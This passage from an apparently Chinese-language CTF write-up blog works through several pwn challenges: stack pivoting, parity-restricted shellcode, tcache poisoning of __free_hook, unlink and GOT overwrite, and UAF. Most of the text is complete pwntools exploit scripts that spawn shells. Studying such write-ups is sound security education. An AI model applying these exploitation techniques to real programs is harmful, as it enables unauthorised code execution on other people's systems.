class="string">&quot;passwd\n&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;0 exit \n&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;remove name\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;passwd\n&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line">registe(<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">registe(<span class="string">&quot;2&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">registe(<span class="string">&quot;3&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">remove(<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">remove(<span class="string">&quot;3&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">remove(<span class="string">&quot;2&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">registe(<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">5</span>*<span class="number">8</span>+<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">registe(<span class="string">&quot;2&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">registe(<span class="string">&quot;ld1ng&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;ld1ng&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://files.catbox.moe/begpcf.png"></p>
<h2 id="0x07-GKCTF-checkin"><a href="#0x07-GKCTF-checkin" class="headerlink" title="0x07 GKCTF checkin"></a>0x07 GKCTF checkin</h2><p>只能溢出8个字节，但是存在野生的双leave ret，可以栈迁移。</p>
<p>先泄露出puts的地址，然后第二次栈溢出返回one_gadget。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x0000000000401ab3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sa(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;admin\x00\x00\x00&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(<span class="number">0x00000000004018B5</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x0000000000602400</span>))</span><br><span class="line">libc_base = l64() - <span class="number">0x80970</span></span><br><span class="line">inf(libc_base)</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">inf(system)</span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">ogg = libc_base + og[<span class="number">1</span>]</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span> + p64(ogg))</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x0000000000602400</span>))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x08-ACTF-parity"><a href="#0x08-ACTF-parity" class="headerlink" title="0x08 ACTF parity"></a>0x08 ACTF parity</h2><p>题目要求如下，用户输入一段shellcode，但添加了奇偶校验，shellcode必须符合奇数偶数交替的条件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">buf = mmap(<span class="number">0LL</span>, <span class="number">0x2000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = read(<span class="number">0</span>, buf, <span class="number">0x2000</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*((_BYTE *)buf + i) &amp; <span class="number">1</span>) != i % <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;bad shellcode!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD))buf)(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>

<p>其中系统调用syscall为0f 05 显然不符合奇偶交替的特点。</p>
<p>另一条路是再次执行read@plt（0x4010f4），重新对 <code>buf</code> 进行输入，因为 <code>rip</code> 接着 <code>read</code> 的触发继续执行，那么输入与制造 <code>shellcode</code> 等长的垃圾字符，继续输入 <code>pwntools</code> 自带的shellcode即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">check=<span class="keyword">lambda</span> code:<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> s:s&amp;<span class="number">1</span>, code))</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">xor rax,3</span></span><br><span class="line"><span class="string">// 0 1 0</span></span><br><span class="line"><span class="string">inc rax</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">shl rax,7</span></span><br><span class="line"><span class="string">// 0 1 0</span></span><br><span class="line"><span class="string">shl rax,1</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0</span></span><br><span class="line"><span class="string">inc rax</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">shl rax,7</span></span><br><span class="line"><span class="string">// 0 1 0</span></span><br><span class="line"><span class="string">shl rax,1</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">xor rax,0xf</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">shl rax,3</span></span><br><span class="line"><span class="string">// 0 1 0</span></span><br><span class="line"><span class="string">shl rax,1</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">xor rax,3</span></span><br><span class="line"><span class="string">// 0 1 0 </span></span><br><span class="line"><span class="string">inc rax</span></span><br><span class="line"><span class="string">// 1</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">// 0 1 0 1</span></span><br><span class="line"><span class="string">xor rdx,0x71</span></span><br><span class="line"><span class="string">// 0</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">// 1 0 </span></span><br><span class="line"><span class="string">call rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(check(shellcode))</span><br><span class="line"><span class="comment"># print(hexdump(shellcode))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">sd(shellcode)</span><br><span class="line"><span class="comment"># sleep(5)</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x000004012F5&#x27;</span>)</span><br><span class="line">payload = fit(&#123;<span class="built_in">len</span>(shellcode): asm(shellcraft.sh())&#125;)</span><br><span class="line"><span class="built_in">print</span>(hexdump(payload))</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>read的效果</p>
<p><img src="https://files.catbox.moe/jvum13.png" alt="image-20230226165151367"></p>
<h2 id="0x09-ACTF-dreams"><a href="#0x09-ACTF-dreams" class="headerlink" title="0x09 ACTF dreams"></a>0x09 ACTF dreams</h2><p>漏洞还是很好找的，在free的时候没有将指针清零，存在UAF，可以edit和show。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve come to sell your dreams.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which one are you trading in? &quot;</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= MAX_DREAMS || idx &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bounds!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You let it go. Suddenly you feel less burdened... less restrained... freed. At last.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8LL</span> * idx + dreams));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your money? Pfft. Get out of here.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br></pre></td></tr></table></figure>

<p>利用方法就是多次修改tcache链，首先由于只能add5次，所以先修改到MAX_DREAMS变量处，将它修改为一个较大的值，之后将tcache改为free函数的地址，申请出来后就可以show出来，泄露出libc基址；之后再次修改为freehook地址，将freehook改为ogg即可。</p>
<p>好久没写这么丑的exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,date,con=<span class="string">&quot;bbbb&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;loses its grip.&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># sl(date)</span></span><br><span class="line">    <span class="comment"># sl(con)</span></span><br><span class="line">    sla(<span class="string">&quot;(mm/dd/yy))?&quot;</span>,date)</span><br><span class="line">    sla(<span class="string">&quot;you dream about?&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;sell your dreams.&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;decipher your dream.&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;I don&#x27;t make the rules. Or do I?&quot;</span>,con)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show_edit(<span class="number">2</span>,p64(<span class="number">0x0000000000404008</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaaa&#x27;</span>,p64(<span class="number">0x9999</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sl(&quot;3&quot;)</span></span><br><span class="line"><span class="comment"># sla(&quot;your dream.&quot;,str(0))</span></span><br><span class="line"><span class="comment"># sla(&quot;I don&#x27;t make the rules. Or do I?&quot;,p64(0x0000403F88))</span></span><br><span class="line">show_edit(<span class="number">0</span>,p64(<span class="number">0x0000403F88</span>))</span><br><span class="line">sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;decipher your dream.&quot;</span>,<span class="built_in">str</span>(<span class="number">526</span>))</span><br><span class="line">libc_base = l64() - <span class="number">0x80970</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">ogg = libc_base + og[<span class="number">1</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">io.recv()</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># sl(&#x27;zzzz&#x27;)</span></span><br><span class="line"><span class="comment"># sl(&#x27;zzzz&#x27;)</span></span><br><span class="line"><span class="comment"># sl(&#x27;zzzz&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(&quot;3. Visit a psychiatrist&quot;,&quot;1&quot;)</span></span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line"><span class="comment"># add(7,&#x27;7&#x27;)</span></span><br><span class="line"><span class="comment"># add(8,&#x27;8&#x27;)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show_edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3. Visit a psychiatrist&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;10&quot;</span>)</span><br><span class="line">sl(p64(ogg))</span><br><span class="line"><span class="comment"># sl(&quot;10&quot;)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)   </span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x0A-Xman-level6-x64"><a href="#0x0A-Xman-level6-x64" class="headerlink" title="0x0A [Xman]level6_x64"></a>0x0A [Xman]level6_x64</h2><p>free时没有检查标志位，并且没有清空指针，所以可以在已经free的状态下再次free</p>
<p>edit时可以自定义任意大小堆块，所以造成溢出</p>
<p>流程：</p>
<ol>
<li>edit溢出泄露堆地址，进而得到全局heap_list地址</li>
<li>unlink，进而可以控制修改heap_list</li>
<li>将heap_list中的堆指针改为atoi的got表，show出来泄露libc地址</li>
<li>修改got表为og(或修改system，add时idx为’/bin/sh’)</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;new note:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(con)))</span><br><span class="line">    sa(<span class="string">&quot;Enter your note:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note number:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Length of note:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(con)))</span><br><span class="line">    sa(<span class="string">&quot;Enter your note:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note number:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment"># leak heap base</span></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">heap_base = uu64(rl().strip(<span class="string">b&#x27;\n&#x27;</span>)) -<span class="number">0x19c0</span> +<span class="number">0x20</span></span><br><span class="line">inf(heap_base)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x80</span>) + p64(heap_base -<span class="number">3</span>*<span class="number">8</span>) + p64(heap_base-<span class="number">2</span>*<span class="number">8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>) +p64(<span class="number">0x90</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak libc base</span></span><br><span class="line">payload2 = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) +p64(<span class="number">0x100</span>)+ p64(heap_base) + p64(<span class="number">1</span>)+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line">show()</span><br><span class="line">libc_base = l64() - <span class="number">0x39ea0</span></span><br><span class="line">inf(libc_base)</span><br><span class="line"><span class="comment"># modify atoi_got to og</span></span><br><span class="line">og = one_gadget(libc_base)[<span class="number">3</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(og))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x0B-Item-Board"><a href="#0x0B-Item-Board" class="headerlink" title="0x0B Item Board"></a>0x0B Item Board</h2><p>free时没有清空指针，存在UAF，可以从unsortedbin中show出libc地址</p>
<p>然后就是类似堆风水，fastbin先进后出，del 1；del 2；再次add时，定义description的大小为1的item大小，便能控制到1 item的结构体，修改函数指针为system即可</p>
<p>方法二是没有对大小进行限制，超过buf的大小造成栈溢出，注意rbp-8的位置需要构造假的结构体指针。</p>
<p><img src="https://files.catbox.moe/8il68l.png" alt="image-20230420170949407"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choose:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Item name?&quot;</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Description&#x27;s len?&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sla(<span class="string">&quot;Description?&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listt</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choose:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which item?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choose:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which item?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">128</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>)</span><br><span class="line">add(<span class="number">128</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>)</span><br><span class="line">add(<span 